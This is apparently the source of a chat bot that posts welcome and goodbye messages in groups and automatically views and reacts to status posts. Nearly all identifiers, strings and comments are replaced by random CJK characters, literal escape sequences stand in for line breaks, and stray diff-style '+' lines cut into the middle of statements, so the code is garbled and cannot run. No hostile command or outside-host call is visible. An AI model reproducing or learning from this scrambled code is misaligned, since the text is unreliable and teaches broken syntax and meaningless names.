_\u5d88\u664e\u944f\u509d\u7402.\_\u51b0\u51d4\u58e6\u60f2\_\u51b0\u51d4\u58e6\u60f2${_\u7b5c\u9794\u9a6a\u7069._\u86af\u987a\u84c5\u6b3a\u5c68\u9c4c || '_薖杲守謻柳缥靖-_籀镾簹鹃'}`;\u000a  \u000a  _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u8b98\u4e69\u5b5c\u4f98\u7602._\u9599\u76a5\u90dc\u5f48('_裩錯揫峭', async (_\u563e\u98a8\u4ea5\u6a70\u8095\u864b\u6f67) => {\u000a    if (_\u9aad\u5dbc\u6801\u8d65\u4f45._\u7961\u76e8\u5bde\u5942 === 'true') {\u000a      for (const _\u88e9\u932f\u63eb\u5ced of _\u563e\u98a8\u4ea5\u6a70\u8095\u864b\u6f67) {\u000a        if (_\u88e9\u932f\u63eb\u5ced._\u5b03\u66a2\u604f\u8a54\u7d91\u8fed === '_擎萋熗媶傯') {\u000a          await _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u83c0\u66b8\u924e\u8ed4\u7cca\u72b0(_\u88e9\u932f\u63eb\u5ced.from, { _\u775c\u55c9\u68a0\u5320\u5536\u9b50: _\u5b28\u56df\u7649\u8aff\u61ba\u66ff });\u000a          await _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u6ed4\u575e\u5182\u6558\u7a52\u6a53(_\u88e9\u932f\u63eb\u5ced._\u5df3\u91af\u583a\u538d, _\u88e9\u932f\u63eb\u5ced.from);\u000a          _\u6a1e\u5288\u5e33\u6ea4._\u80b6\u8b4a\u84df\u7e42\u6ac5(`\u1f4de _\u80a9\u8043\u6d25\u7623\u98dc\u678a\u74f6 _\u88e9\u932f\u63eb\u5ced from ${_\u88e9\u932f\u63eb\u5ced.from}`);\u000a        }\u000a      }\u000a    }\u000a  });\u000a\u000a  // _\u510c\u5635\u8e91\u7002 _\u75ba\u63b7\u5950\u6f3a\u5dac for _\u8f58\u96d1\u5635\u8318\u9216\u99ef _\u691b\u6284\u8474\u8bc7\u74d9\u4e0f\u5098\u000a  const _\u5a09\u8695\u5c7d\u6eb9 = ['😊', '👍', '😂', '❤️', '🔥', '🥰', '👌', '💯', '🤣', '😎', '✨', '⭐', '🌟', '💫', '⚡', '💥', '🙏', '🎉', '👏', '💯', '👑', '🤖', '🫡', '✅', '🔰', '💚', '💙', '💜', '🖤', '🤍', '💛', '🧡', '💖', '💝', '💞'];\u000a  \u000a  // _\u916d\u626d\u4f49\u7726\u4fea _\u4f2c\u7791\u9d25\u91ac\u8e24\u54ce\u6936\u000a  _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u8b98\u4e69\u5b5c\u4f98\u7602._\u9599\u76a5\u90dc\u5f48('_陼呴瑕镃._伬瞑鴥醬踤哎椶', _\u5155\u67be\u9da1\u9bc9\u5ce0\u75bd\u6c40);\u000a  \u000a  // ==================== _\u902c\u943a\u84a1\u9fd3\u8052\u82de _\u5acf\u7e9b\u8e0e\u6a1d\u7eef\u75ca\u9012 _\u9400\u724b\u7409\u9e64 (_\u578a\u643c\u84d4\u57d3\u8a5e\u5d01\u6a31/_\u8961\u733b\u8194\u84ac\u780d\u7887) ====================\u000a  _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u8b98\u4e69\u5b5c\u4f98\u7602._\u9599\u76a5\u90dc\u5f48('_用欢蛀奃銲鴷襴-_买烏襗徺僔._伬瞑鴥醬踤哎椶', async (_\u4f2c\u7791\u9d25\u91ac\u8e24\u54ce\u6936) => {\u000a    try {\u000a      const { _\u5df3\u91af\u583a\u538d, _\u4e70\u70cf\u8957\u5fba\u50d4, _\u692d\u9b9d\u53c9\u71b9\u901f\u72b9 } = _\u4f2c\u7791\u9d25\u91ac\u8e24\u54ce\u6936;\u000a      \u000a      if (!_\u5df3\u91af\u583a\u538d || !_\u4e70\u70cf\u8957\u5fba\u50d4 || !_\u692d\u9b9d\u53c9\u71b9\u901f\u72b9) return;\u000a      \u000a      const _\u824a\u9e13\u598d\u8f79\u6804\u920e\u896a = await _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u824a\u9e13\u598d\u8f79\u6804\u920e\u896a(_\u5df3\u91af\u583a\u538d).catch(() => null);\u000a      if (!_\u824a\u9e13\u598d\u8f79\u6804\u920e\u896a) return;\u000a      \u000a      const _\u9094\u826e\u6fb0\u8936 = _\u824a\u9e13\u598d\u8f79\u6804\u920e\u896a._\u9b52\u674e\u93cf\u8b72\u7e40 || '_噰蜛皋豓濕';\u000a      const _\u8363\u4e02\u762d\u89a3\u9f04\u5009 = _\u824a\u9e13\u598d\u8f79\u6804\u920e\u896a._\u84d4\u8678\u6510\u8072\u9601\u6b9e\u7d24 || '_麲擂笺庎 _艓蚟敚蠸丒';\u000a      const _\u966b\u8a04\u88ec\u5d95\u652f\u4e98 = _\u824a\u9e13\u598d\u8f79\u6804\u920e\u896a._\u4e70\u70cf\u8957\u5fba\u50d4._\u81bb\u8e0c\u4fc5\u6793\u513d\u98f2;\u000a      \u000a      // _\u6e80\u6ed4\u71bd\u99ee\u78bd\u8d99\u9a39 _\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974 _\u9e25\u73ad\u61e6\u9cc8\u61bd\u6279\u000a      const _\u9e25\u73ad\u61e6\u9cc8\u61bd\u6279 = _\u790e\u6738\u9344\u807e.get(_\u5df3\u91af\u583a\u538d) || {\u000a        _\u6dea\u564a\u87d7\u546c\u53e2\u724f\u62bc: true,\u000a        _\u8829\u6d34\u653b\u6026\u6812\u8851\u55e1: true,\u000a        _\u8d1c\u7184\u95cc\u5c05: _\u5a4a\u9b06\u508c\u4e6c\u559d\u76d5,\u000a        _\u7c2c\u7d01\u8cc3\u7267\u89ca: _\u7604\u6fbb\u7a2c\u6480\u81d0,\u000a        _\u53e3\u65bc\u7fc5\u5fa6\u7089\u804d: true,\u000a        _\u67cf\u96a3\u76f2\u6a64\u931e\u55c6\u8e3a: true\u000a      };\u000a      \u000a      for (const _\u7ca3\u6856\u654c\u605e of _\u4e70\u70cf\u8957\u5fba\u50d4) {\u000a        const _\u8192\u5a25\u924d\u8cd9\u7a6f = _\u7ca3\u6856\u654c\u605e._\u7f73\u7196\u9b69\u8df1\u6c6f\u654b('@')[0];\u000a        const _\u6e7b\u9cb4\u6c3c\u5e8d\u855f\u85f7\u8c38 = _\u7ca3\u6856\u654c\u605e._\u7f73\u7196\u9b69\u8df1\u6c6f\u654b('@')[0];\u000a        \u000a        if (_\u692d\u9b9d\u53c9\u71b9\u901f\u72b9 === '_駶璋鬆椾') {\u000a          // _\u578a\u643c\u84d4\u57d3\u8a5e\u5d01\u6a31 _\u689c\u567f\u6b50\u5072\u9192 - _\u740b\u74c7\u8b71\u658c\u5636\u5331 if _\u8e27\u6cea\u6aca\u6cce\u866b\u9f98\u5c94\u000a          if (_\u9e25\u73ad\u61e6\u9cc8\u61bd\u6279._\u6dea\u564a\u87d7\u546c\u53e2\u724f\u62bc) {\u000a            try {\u000a              // _\u6e80\u6ed4\u71bd\u99ee\u78bd\u8d99\u9a39 _\u67a9\u69da\u952f\u76f1\u9453\u6886'_瑀糩錓琩瑊髒庭 _袿子餒郼 _咆澏奀俕鯷
+              const _藧鬼嵐硶熕 = await _跣戹诽侕遱嫆(_壏其蓙龸恆腅饃, _粣桖敌恞);
+              
+              // _勏熀韄凴 _淪噊蟗呬叢牏押 _駑徕師凙样逹 with _潕滎洃赔枅
+              let _浆輟甐璢酧蹬 = _鸥玭懦鳈憽批._贜熄闌尅 || _婊鬆傌乬喝盕;
+              _浆輟甐璢酧蹬 = _浆輟甐璢酧蹬
+                ._寢梕变轄熔龥鱦(/@_枩槚锯盱鑓梆/_跒詄鄅酬, `@${_\u8192\u5a25\u924d\u8cd9\u7a6f}`)
+                ._寢梕变轄熔龥鱦(/@_用欢蛀奃銲鴷襴/_跒詄鄅酬, _邔艮澰褶)
+                ._寢梕变轄熔龥鱦(/@_豇驜荸舷硻/_跒詄鄅酬, _陫訄裬嶕支亘)
+                ._寢梕变轄熔龥鱦(/@_蓔虸攐聲阁殞紤/_跒詄鄅酬, _荣丂瘭覣鼄倉._讅臎屍贳(0, 100));
+              
+              // _厾蜫棧砍频臷渴 _淪噊蟗呬叢牏押 _駑徕師凙样逹 with _枩槚锯盱鑓梆'_\u7440\u7ce9\u9313\u7429\u744a\u9ad2\u5ead _\u6322\u586a\u6100\u7a2b\u5444\u000a              await _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u83c0\u66b8\u924e\u8ed4\u7cca\u72b0(_\u5df3\u91af\u583a\u538d, {\u000a                _\u94a6\u6fca\u5383\u6eeb\u756f\u555f\u7fb5: { _\u53df\u4f84\u8ee9\u5bc8\u76ab\u9444: _\u85e7\u9b3c\u5d50\u7876\u7195 },\u000a                _\u719c\u8133\u8765\u93f7\u6f7b\u5f74\u508d: _\u6d46\u8f1f\u7510\u74a2\u9167\u8e6c,\u000a                _\u5750\u8411\u5cae\u5390\u6a24\u69da: [_\u7ca3\u6856\u654c\u605e]\u000a              }).catch(async () => {\u000a                // _\u602e\u71c8\u8387\u97a8 _\u5416\u96a6\u5527\u65a3\u8776 _\u775c\u55c9\u68a0\u5320\u5536\u9b50 if _\u94a6\u6fca\u5383\u6eeb\u756f\u555f\u7fb5 _\u8730\u5092\u5cd2\u9118\u6708\u000a                await _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u83c0\u66b8\u924e\u8ed4\u7cca\u72b0(_\u5df3\u91af\u583a\u538d, {\u000a                  _\u775c\u55c9\u68a0\u5320\u5536\u9b50: _\u6d46\u8f1f\u7510\u74a2\u9167\u8e6c,\u000a                  _\u5750\u8411\u5cae\u5390\u6a24\u69da: [_\u7ca3\u6856\u654c\u605e]\u000a                });\u000a              });\u000a              \u000a              _\u6a1e\u5288\u5e33\u6ea4._\u80b6\u8b4a\u84df\u7e42\u6ac5(`\u1f44b _\u7aea\u7212\u55b2\u4f68\u7d30\u6409\u7c26 _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 _\u8d21\u8a2d\u96bd\u692d\u6868 _\u5416\u96a6\u5527\u65a3\u8776 ${_\u8192\u5a25\u924d\u8cd9\u7a6f} in ${_\u9094\u826e\u6fb0\u8936}`);\u000a            } catch (_\u7fac\u9f8e\u62e1\u9225\u9a11) {\u000a              _\u6a1e\u5288\u5e33\u6ea4._\u7fac\u9f8e\u62e1\u9225\u9a11("\u274c _\u7aea\u7212\u55b2\u4f68\u7d30\u6409\u7c26 _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 _\u7fac\u9f8e\u62e1\u9225\u9a11:", _\u7fac\u9f8e\u62e1\u9225\u9a11);\u000a            }\u000a          }\u000a          \u000a        } else if (_\u692d\u9b9d\u53c9\u71b9\u901f\u72b9 === '_鐱雐筺稇') {\u000a          // _\u8961\u733b\u8194\u84ac\u780d\u7887 _\u689c\u567f\u6b50\u5072\u9192 - _\u740b\u74c7\u8b71\u658c\u5636\u5331 if _\u8e27\u6cea\u6aca\u6cce\u866b\u9f98\u5c94\u000a          if (_\u9e25\u73ad\u61e6\u9cc8\u61bd\u6279._\u8829\u6d34\u653b\u6026\u6812\u8851\u55e1) {\u000a            try {\u000a              // _\u6e80\u6ed4\u71bd\u99ee\u78bd\u8d99\u9a39 _\u67a9\u69da\u952f\u76f1\u9453\u6886'_瑀糩錓琩瑊髒庭 _袿子餒郼 _咆澏奀俕鯷
+              const _藧鬼嵐硶熕 = await _跣戹诽侕遱嫆(_壏其蓙龸恆腅饃, _粣桖敌恞).catch(() => '_\u6a27\u8bee\u8555\u860d://_\u51b0\u51d4\u58e6\u60f2._\u568e\u54b2\u8ee4\u973c\u50dd._\u9658\u6039\u629c\u87bb\u5580\u69cd/_\u9363\u5562\u4f4e\u5773\u509a\u9984\u98ec._\u7be6\u64a0\u7088\u9dd2');
+              
+              // _勏熀韄凴 _蠩洴攻怦栒衑嗡 _駑徕師凙样逹 with _潕滎洃赔枅
+              let _聄攽玤粝汞 = _鸥玭懦鳈憽批._簬紁賃牧觊 || _瘄澻稬撀臐;
+              _聄攽玤粝汞 = _聄攽玤粝汞
+                ._寢梕变轄熔龥鱦(/@_枩槚锯盱鑓梆/_跒詄鄅酬, `@${_\u8192\u5a25\u924d\u8cd9\u7a6f}`)
+                ._寢梕变轄熔龥鱦(/@_用欢蛀奃銲鴷襴/_跒詄鄅酬, _邔艮澰褶)
+                ._寢梕变轄熔龥鱦(/@_豇驜荸舷硻/_跒詄鄅酬, _陫訄裬嶕支亘);
+              
+              // _厾蜫棧砍频臷渴 _蠩洴攻怦栒衑嗡 _駑徕師凙样逹 with _枩槚锯盱鑓梆'_\u7440\u7ce9\u9313\u7429\u744a\u9ad2\u5ead _\u6322\u586a\u6100\u7a2b\u5444\u000a              await _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u83c0\u66b8\u924e\u8ed4\u7cca\u72b0(_\u5df3\u91af\u583a\u538d, {\u000a                _\u94a6\u6fca\u5383\u6eeb\u756f\u555f\u7fb5: { _\u53df\u4f84\u8ee9\u5bc8\u76ab\u9444: _\u85e7\u9b3c\u5d50\u7876\u7195 },\u000a                _\u719c\u8133\u8765\u93f7\u6f7b\u5f74\u508d: _\u8044\u653d\u73a4\u7c9d\u6c5e,\u000a                _\u5750\u8411\u5cae\u5390\u6a24\u69da: [_\u7ca3\u6856\u654c\u605e]\u000a              }).catch(async () => {\u000a                // _\u602e\u71c8\u8387\u97a8 _\u5416\u96a6\u5527\u65a3\u8776 _\u775c\u55c9\u68a0\u5320\u5536\u9b50 if _\u94a6\u6fca\u5383\u6eeb\u756f\u555f\u7fb5 _\u8730\u5092\u5cd2\u9118\u6708\u000a                await _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u83c0\u66b8\u924e\u8ed4\u7cca\u72b0(_\u5df3\u91af\u583a\u538d, {\u000a                  _\u775c\u55c9\u68a0\u5320\u5536\u9b50: _\u8044\u653d\u73a4\u7c9d\u6c5e,\u000a                  _\u5750\u8411\u5cae\u5390\u6a24\u69da: [_\u7ca3\u6856\u654c\u605e]\u000a                });\u000a              });\u000a              \u000a              _\u6a1e\u5288\u5e33\u6ea4._\u80b6\u8b4a\u84df\u7e42\u6ac5(`\u1f44b _\u895d\u77bc\u676c\u7ab0\u97fb\u9bfa _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 _\u8d21\u8a2d\u96bd\u692d\u6868 for ${_\u8192\u5a25\u924d\u8cd9\u7a6f} in ${_\u9094\u826e\u6fb0\u8936}`);\u000a            } catch (_\u7fac\u9f8e\u62e1\u9225\u9a11) {\u000a              _\u6a1e\u5288\u5e33\u6ea4._\u7fac\u9f8e\u62e1\u9225\u9a11("\u274c _\u895d\u77bc\u676c\u7ab0\u97fb\u9bfa _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 _\u7fac\u9f8e\u62e1\u9225\u9a11:", _\u7fac\u9f8e\u62e1\u9225\u9a11);\u000a            }\u000a          }\u000a        }\u000a      }\u000a    } catch (_\u7fac\u9f8e\u62e1\u9225\u9a11) {\u000a      _\u6a1e\u5288\u5e33\u6ea4._\u7fac\u9f8e\u62e1\u9225\u9a11("\u274c _\u7aea\u7212\u55b2\u4f68\u7d30\u6409\u7c26/_\u895d\u77bc\u676c\u7ab0\u97fb\u9bfa _\u7fac\u9f8e\u62e1\u9225\u9a11:", _\u7fac\u9f8e\u62e1\u9225\u9a11);\u000a    }\u000a  });\u000a\u000a  // _\u9755\u7d5d\u5e81\u9b47\u9ff4 _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 _\u5340\u6107\u6705\u9bb0\u000a  _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u8b98\u4e69\u5b5c\u4f98\u7602._\u9599\u76a5\u90dc\u5f48('_賉釋帓珚欐跰霠._璟揼耽魵', async (_\u8425\u9138\u9f3e\u742f\u6f01) => {\u000a    try {\u000a      const _\u71be\u60ea\u88f9\u5247\u9bd5 = _\u8425\u9138\u9f3e\u742f\u6f01._\u8cc9\u91cb\u5e13\u73da\u6b10\u8df0\u9720[0];\u000a      \u000a      if (!_\u71be\u60ea\u88f9\u5247\u9bd5 || !_\u71be\u60ea\u88f9\u5247\u9bd5._\u99d1\u5f95\u5e2b\u51d9\u6837\u9039) {\u000a        return;\u000a      }\u000a      \u000a      // ============ _\u5009\u8cd0\u6001\u98e8\u5065\u619f _\u58ff\u7a4f\u6115\u88d0\u9735\u7a88\u8069 (_\u5acb\u7ab7\u666d\u9327) ============\u000a      if (_\u71be\u60ea\u88f9\u5247\u9bd5._\u56df\u5e97\u5d1d\u666b\u5f9e && _\u71be\u60ea\u88f9\u5247\u9bd5._\u56df\u5e97\u5d1d\u666b\u5f9e._\u8d8b\u97c3\u9650\u933a\u7d97\u88e2 === '_嬃暢恏詔綑迭@_芅牊麐鳒塅枼躐') {\u000a        \u000a        // _\u5e44\u8d9c\u8621\u69fb _\u5009\u8cd0\u6001\u98e8\u5065\u619f _\u5f39\u9bde\u86fa\u9b29\u5c8a - _\u838b\u549a\u5337\u73ef\u54b0\u5d23 _\u5b03\u66a2\u604f\u8a54\u7d91\u8fed _\u4fb4\u68e4\u5948\u8f97\u67cb\u55eb\u5c0a _\u5825\u9fcb\u692c\u78df _\u858c\u8528\u6ebc\u6c33\u74c1\u000a        if (_\u9aad\u5dbc\u6801\u8d65\u4f45._\u75fe\u71f5\u6614\u7270\u7f35\u6e74 === 'true') {\u000a          try {\u000a            await _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u64c5\u74ae\u901d\u7c13\u94d1\u71a4\u593a([_\u71be\u60ea\u88f9\u5247\u9bd5._\u56df\u5e97\u5d1d\u666b\u5f9e]);\u000a            _\u6a1e\u5288\u5e33\u6ea4._\u80b6\u8b4a\u84df\u7e42\u6ac5("\u1f4d6 _\u569e\u51ff\u8b2c\u8206 _\u6bc6\u7ecb\u53a3\u5789\u7a4b");\u000a            \u000a            // _\u569e\u51ff\u8b2c\u8206 _\u8822\u95f9\u5e55\u74c9\u5c82\u8557 _\u691b\u6284\u8474\u8bc7\u74d9\u4e0f\u5098 _\u6987\u90e3\u7f8d\u8782\u562f\u63a0\u5b40 _\u858c\u8528\u6ebc\u6c33\u74c1\u000a            const _\u9255\u5493\u8234\u732b = await _\u739d\u9f23\u9745\u50e2\u6ca9\u9d0b\u8c10(_\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u67a9\u69da\u952f\u76f1\u9453\u6886._\u5df3\u91af\u583a\u538d);\u000a            await _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u83c0\u66b8\u924e\u8ed4\u7cca\u72b0(_\u71be\u60ea\u88f9\u5247\u9bd5._\u56df\u5e97\u5d1d\u666b\u5f9e._\u8d8b\u97c3\u9650\u933a\u7d97\u88e2, {\u000a              _\u691b\u6284\u8474\u8bc7\u74d9\u4e0f\u5098: {\u000a                _\u56df\u5e97\u5d1d\u666b\u5f9e: _\u71be\u60ea\u88f9\u5247\u9bd5._\u56df\u5e97\u5d1d\u666b\u5f9e,\u000a                _\u775c\u55c9\u68a0\u5320\u5536\u9b50: '💚'\u000a              }\u000a            }, {\u000a              _\u92bc\u6f7b\u7020\u6e8a\u857f: [_\u71be\u60ea\u88f9\u5247\u9bd5._\u56df\u5e97\u5d1d\u666b\u5f9e._\u7ca3\u6856\u654c\u605e, _\u9255\u5493\u8234\u732b]\u000a            }).catch(() => {});\u000a            \u000a          } catch (_\u7fac\u9f8e\u62e1\u9225\u9a11) {\u000a            _\u6a1e\u5288\u5e33\u6ea4._\u7fac\u9f8e\u62e1\u9225\u9a11("\u274c _\u9f38\u9c17\u7597\u6b71\u6949 _\u5416\u96a6\u5527\u65a3\u8776 _\u6b2a\u9358\u6a91\u5346\u8c6d\u79bb _\u5b03\u66a2\u604f\u8a54\u7d91\u8fed _\u9b54\u9725\u91dd\u67d7\u7b5d\u721b\u5b58 _\u5825\u9fcb\u692c\u78df:", _\u7fac\u9f8e\u62e1\u9225\u9a11);\u000a          }\u000a        }\u000a        \u000a        // _\u5e44\u8d9c\u8621\u69fb _\u5009\u8cd0\u6001\u98e8\u5065\u619f _\u7819\u4e0f\u93e1\u7975 - _\u569e\u51ff\u8b2c\u8206 _\u9f33\u9cb1\u8c5d\u87b0\u7861 _\u4fb4\u68e4\u5948\u8f97\u67cb\u55eb\u5c0a _\u8e99\u892e\u50e5\u6fc3\u58a7\u92eb\u000a        if (_\u9aad\u5dbc\u6801\u8d65\u4f45._\u82cc\u600d\u9f7d\u6e27\u5e36\u51ab\u4ef8 === 'true' && _\u71be\u60ea\u88f9\u5247\u9bd5._\u56df\u5e97\u5d1d\u666b\u5f9e._\u7ca3\u6856\u654c\u605e) {\u000a          try {\u000a            const _\u6cbd\u97d9\u82a2\u8369 = _\u7b5c\u9794\u9a6a\u7069._\u664d\u690e\u63e9\u6efd\u7268 || '_猢剜鄅砵嚻剥 for _嬃暢恏詔綑迭! ❤️';\u000a            await _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u83c0\u66b8\u924e\u8ed4\u7cca\u72b0(_\u71be\u60ea\u88f9\u5247\u9bd5._\u56df\u5e97\u5d1d\u666b\u5f9e._\u7ca3\u6856\u654c\u605e, {\u000a              _\u775c\u55c9\u68a0\u5320\u5536\u9b50: _\u6cbd\u97d9\u82a2\u8369\u000a            }).catch(() => {});\u000a          } catch (_\u7fac\u9f8e\u62e1\u9225\u9a11) {}\u000a        }\u000a        \u000a        return; // _\u569e\u51ff\u8b2c\u8206 _\u8cc9\u91cb\u5e13\u73da\u6b10\u8df0\u9720 _\u4fb4\u68e4\u5948\u8f97\u67cb\u55eb\u5c0a _\u850f\u618e\u93d4\u562a\u9dac\u56ca\u7a91 _\u5868\u713c\u82e7\u54df _\u669f\u55e5\u75c0\u7c46 _\u9630\u8df4\u6bbd\u93e4\u7e66\u000a      }\u000a      \u000a      // _\u6e80\u6ed4\u71bd\u99ee\u78bd\u8d99\u9a39 _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 _\u60e2\u7fd2\u6f0f\u8971\u538f\u9f53 _\u5396\u7b50\u65a2\u5bb8\u764a _\u59f4\u71d8\u8947\u70b1\u9889\u724b\u8fd0\u000a      const _\u4edf\u7dd1\u5de5\u8ba2 = _\u9a8f\u62fe\u7a6e\u5978(_\u71be\u60ea\u88f9\u5247\u9bd5._\u99d1\u5f95\u5e2b\u51d9\u6837\u9039) || '_蛔惸楃慚菧';\u000a      \u000a      // _\u6e80\u6ed4\u71bd\u99ee\u78bd\u8d99\u9a39 _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 _\u775c\u55c9\u68a0\u5320\u5536\u9b50\u000a      let _\u9e6b\u9328\u8171\u5a5b\u5aee\u9aec\u5e14 = '';\u000a      if (_\u4edf\u7dd1\u5de5\u8ba2 === '_蛔惸楃慚菧') {\u000a        _\u9e6b\u9328\u8171\u5a5b\u5aee\u9aec\u5e14 = _\u71be\u60ea\u88f9\u5247\u9bd5._\u99d1\u5f95\u5e2b\u51d9\u6837\u9039._\u86d4\u60f8\u6943\u615a\u83e7 || '';\u000a      } else if (_\u4edf\u7dd1\u5de5\u8ba2 === '_鼐鳤蠎溽棛覃') {\u000a        _\u9e6b\u9328\u8171\u5a5b\u5aee\u9aec\u5e14 = _\u71be\u60ea\u88f9\u5247\u9bd5._\u99d1\u5f95\u5e2b\u51d9\u6837\u9039._\u9f10\u9ce4\u880e\u6ebd\u68db\u8983?._\u775c\u55c9\u68a0\u5320\u5536\u9b50 || '';\u000a      } else if (_\u4edf\u7dd1\u5de5\u8ba2 === '_顄麹岋錏帛鿞媡') {\u000a        _\u9e6b\u9328\u8171\u5a5b\u5aee\u9aec\u5e14 = _\u71be\u60ea\u88f9\u5247\u9bd5._\u99d1\u5f95\u5e2b\u51d9\u6837\u9039._\u9844\u9eb9\u5c8b\u930f\u5e1b\u9fde\u5aa1?._\u719c\u8133\u8765\u93f7\u6f7b\u5f74\u508d || '';\u000a      } else if (_\u4edf\u7dd1\u5de5\u8ba2 === '_螹憏嶛劫') {\u000a        _\u9e6b\u9328\u8171\u5a5b\u5aee\u9aec\u5e14 = _\u71be\u60ea\u88f9\u5247\u9bd5._\u99d1\u5f95\u5e2b\u51d9\u6837\u9039._\u87b9\u618f\u5d9b\u52ab?._\u719c\u8133\u8765\u93f7\u6f7b\u5f74\u508d || '';\u000a      }\u000a      \u000a      // _\u7992\u5448\u84ff\u857c\u7687 _\u554a\u4ef3\u75c9\u504f\u7f8d\u8f0b _\u7cd0\u7e28\u5ad7\u8585\u5f4f\u721d\u541b\u000a      const _\u554a\u4ef3\u75c9\u504f\u7f8d\u8f0b = _\u74c8\u6dad\u8a6d\u7f4f\u545b\u7817\u87f1(_\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943, _\u71be\u60ea\u88f9\u5247\u9bd5);\u000a      \u000a      // _\u5ac5\u9bb3\u51db\u88cf\u6360\u76cf if _\u57c8\u68d2\u55b2\u7175'_瑀糩錓琩瑊髒庭 _愲诡扔诹鈳 _蝛煽錛懰鍫鏕
+      const _揙譠疵崿乼檁覎 = _鹫錨腱婛嫮髬帔._蕾躕琮嫏(_氚礴蔛牺匪婹);
+      const _蝛煽錛懰鍫鏕 = _揙譠疵崿乼檁覎 ? _鹫錨腱婛嫮髬帔._陁壛泒吃庛(_氚礴蔛牺匪婹._膻踌俅枓儽飲)._罳熖魩跱汯敋(' ')[0]._陘减柪搨擔鹨()._臰鬑啙艇冑沉鏍() : '';
+      const _魾崟坤乛嫡跮徚 = _鹫錨腱婛嫮髬帔._罳熖魩跱汯敋(' ')._陁壛泒吃庛(1);
+      const _堈鷻懳椵 = _魾崟坤乛嫡跮徚._囻烿竎蚤(' ');
+      const from = _熾惪裹則鯕._囟店崝晫從._趋韃限錺綗裢;
+      const _稓痾塅陟榖 = _熾惪裹則鯕._囟店崝晫從._粣桖敌恞 || _熾惪裹則鯕._囟店崝晫從._趋韃限錺綗裢;
+      const _抁阋遖痳迄琄 = _稓痾塅陟榖._罳熖魩跱汯敋('@')[0];
+      const _鉨糪靌毪蟟匕歇 = _壏其蓙龸恆腅饃._枩槚锯盱鑓梆._巳醯堺厍._罳熖魩跱汯敋(':')[0] + '@_\u7440\u7ce9\u9313\u7429\u744a\u9ad2\u5ead._\u716f\u82d4\u7334\u67c8._\u7336\u5692\u9ec0\u5bdd\u885a';
+      const _嫚塹锐迏 = from._子偓嚩癎跹流埶('@_\u8dd2\u8a44\u9105\u916c._\u776e\u6ed8\u5ba8\u6a73\u9450');
+      const _筥鍥涆倎蛎蜙 = _眵贴诌闭虿坠坭._鹏兼衖穴(_抁阋遖痳迄琄);
+      const _湻鲴氼庍蕟藷谸 = _熾惪裹則鯕._湻鲴氼庍蕟藷谸 || _抁阋遖痳迄琄;
+      const _浵沎沚襇暣蝅桐 = _壏其蓙龸恆腅饃._枩槚锯盱鑓梆._巳醯堺厍._罳熖魩跱汯敋(':')[0];
+      const _仏轡勗蔸 = _抁阋遖痳迄琄 === _浵沎沚襇暣蝅桐;
+      
+      // _満滔熽駮碽趙騹 _坐萑岮厐樤槚
+      let _坐萑岮厐樤槚 = [];
+      if (_仟緑工订 === '_\u9f10\u9ce4\u880e\u6ebd\u68db\u8983' && _熾惪裹則鯕._駑徕師凙样逹._鼐鳤蠎溽棛覃?._珦釩緊幸箎?._姩部鹯蛲哇躣) {
+        _坐萑岮厐樤槚 = _熾惪裹則鯕._駑徕師凙样逹._鼐鳤蠎溽棛覃._珦釩緊幸箎._姩部鹯蛲哇躣;
+      }
+      
+      // _噰蜛皋豓濕 _瘿惽狠稁鲏惊渳
+      let _艊鸓妍轹栄鈎襪, _邔艮澰褶, _买烏襗徺僔, _跘騎牔屓, _懷痬葪崩鑃, _复誣跇殈價鸟;
+      if (_嫚塹锐迏) {
+        _艊鸓妍轹栄鈎襪 = await _壏其蓙龸恆腅饃._艊鸓妍轹栄鈎襪(from).catch(() => ({}));
+        _邔艮澰褶 = _艊鸓妍轹栄鈎襪?._魒李鏏譲繀 || '';
+        _买烏襗徺僔 = _艊鸓妍轹栄鈎襪?._买烏襗徺僔 || [];
+        _跘騎牔屓 = _买烏襗徺僔._狉摊劼籓浛(_鮈蓜晏譚讠報 => _鮈蓜晏譚讠報._荗蹈儻鋶諂螳炬)._臲絒鍄击(_鮈蓜晏譚讠報 => _鮈蓜晏譚讠報._巳醯堺厍);
+        _懷痬葪崩鑃 = _跘騎牔屓._鹏兼衖穴(_鉨糪靌毪蟟匕歇);
+        _复誣跇殈價鸟 = _跘騎牔屓._鹏兼衖穴(_稓痾塅陟榖);
+      }
+      
+      // _満滔熽駮碽趙騹 _用欢蛀奃銲鴷襴 _鸥玭懦鳈憽批
+      let _瘥坵譋籢誌 = _礎朸鍄聾.get(from) || {
+        _淪噊蟗呬叢牏押: true,
+        _蠩洴攻怦栒衑嗡: true,
+        _贜熄闌尅: _婊鬆傌乬喝盕,
+        _簬紁賃牧觊: _瘄澻稬撀臐,
+        _口於翅徦炉聍: true,
+        _柏隣盲橤錞嗆踺: true
+      };
+      
+      // _翚醫湹鯥恓缀 function
+      const _躙褮僥濃墧鋫 = (_睜嗉梠匠唶魐) => {
+        _壏其蓙龸恆腅饃._菀暸鉎軔糊犰(from, { _睜嗉梠匠唶魐 }, { _缝蛚揕顮棜鎒跐: _熾惪裹則鯕 });
+      };
+      
+      // _僴棓谍颞 _駑徕師凙样逹 for _黐鵻蹱懘強祻-delete
